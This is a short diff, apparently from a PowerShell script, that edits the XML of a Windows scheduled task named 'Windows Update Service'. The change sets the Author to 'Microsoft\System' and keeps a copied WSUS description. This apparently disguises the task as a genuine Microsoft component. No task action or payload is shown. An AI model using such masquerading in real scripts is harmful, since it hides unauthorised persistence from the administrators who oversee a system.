@@ -24,7 +24,7 @@ $updateservxml = @"
 <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <RegistrationInfo>
     <Date>2023-10-13T00:56:52.6271595</Date>
-    <Author>System\User</Author>
+    <Author>Microsoft\System</Author>
     <Description>Windows Server Update Services, previously known as Software Update Services, is a computer program and network service developed by Microsoft Corporation that enables administrators to manage the distribution of updates and hotfixes released for Microsoft products to computers in a corporate environment.</Description>
     <URI>\Windows Update Service</URI>
   </RegistrationInfo>
